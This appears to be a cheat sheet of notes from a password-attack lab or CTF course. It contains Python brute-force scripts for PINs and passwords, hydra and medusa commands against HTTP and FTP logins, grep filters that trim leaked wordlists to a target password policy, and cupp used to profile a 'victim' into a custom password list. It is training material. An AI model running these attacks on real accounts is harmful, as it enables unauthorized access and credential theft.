## Python coding

### Bruteforce with 4 digits
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Bruteforce with dictionary with only password
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## Pen-testing

### Basic http Auth
```zsh
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt IP http-get / -s PORT
```

### Auth with a POST form 
```zsh
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### FTP auth
```zsh
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

## Grepping for password policices

### Cut to 8 characters minimum
```zsh
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```

### Enforces the policy's demand for at least one uppercase letter
```zsh
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```

### Enforces the policy's demand for at least one lowercase letter
```zsh
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```

### Enforces the policy's demand for at least one numerical digit
```zsh
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

## Wordlists
```zsh
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
```

```zsh
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
```

```zsh
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
```

## Generating custom wordlists 

### Generating custom wordlists with username-anarchy 


```zsh
sudo apt install ruby -y
```

```zsh
git clone https://github.com/urbanadventurer/username-anarchy.git
```

```zsh
cd username-anarchy
```

```zsh
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## Generating custom wordlists with cupp

```zsh
sudo apt-get install -y cupp
```

```zsh
cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```


## Commands for testing access and some other useful ones


### List active ports

```zsh
netstat -tulpn | grep LISTEN
```

```zsh
nmap localhost
```

